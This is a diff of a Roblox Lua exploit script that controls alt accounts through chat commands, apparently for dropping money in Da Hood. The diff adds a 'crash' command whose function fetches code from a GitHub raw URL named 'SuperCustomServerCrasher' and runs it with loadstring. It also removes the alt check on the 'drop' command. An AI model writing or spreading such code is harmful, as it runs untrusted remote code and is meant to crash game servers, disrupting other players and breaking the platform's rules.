@@ -3,11 +3,12 @@
 getgenv().potatopc = false
 getgenv().advertt = false
 getgenv().advert = "This is your advert, use it to advertise your DHC server while selling"
-getgenv().ControllerID = 1944337406
+getgenv().ControllerID = 828591211
 getgenv().dropconstant = false
 getgenv().amountofalts = 2
 getgenv().alts = {
-    A1 = 828591211,
+    A1 = 6464646,
+    A2 = 854858585,
 }
 
 
@@ -126,6 +127,10 @@ function freeze()
 
 end
 
+function swagmodecrash()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end
+
 
 
 --FUNCTION ENDS
@@ -148,8 +153,9 @@ if iscontroller == false then
     potatopcheck(getgenv().potatopc)
 end
 
-controllerplayer.Chatted:Connect(function(msg)
-    if msg == "drop" and isalt == true then
+
+controllername.Chatted:Connect(function(msg)
+    if msg == "drop" then 
         dropconstant = true
         drop()
     elseif msg == "setup" then
@@ -167,7 +173,8 @@ controllerplayer.Chatted:Connect(function(msg)
         amountgui()
     elseif msg == "freeze" then
         freeze()
+    elseif msg == "crash" then
+        swagmodecrash()
     end
 end)
 
-   
